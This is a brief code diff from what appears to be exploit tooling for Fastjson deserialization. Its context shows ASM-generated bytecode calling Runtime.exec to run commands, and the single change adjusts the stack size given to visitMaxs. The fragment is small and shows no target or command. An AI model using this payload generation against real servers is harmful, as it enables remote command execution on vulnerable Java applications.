@@ -119,7 +119,7 @@ public class FastjsonChainHandler implements ChainHandler {
             "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
         mv.visitInsn(org.objectweb.asm.Opcodes.POP);
         mv.visitInsn(org.objectweb.asm.Opcodes.RETURN);
-        mv.visitMaxs(4, 0);
+        mv.visitMaxs(5, 0);
         mv.visitEnd();
         cw.visitEnd();
         return cw.toByteArray();
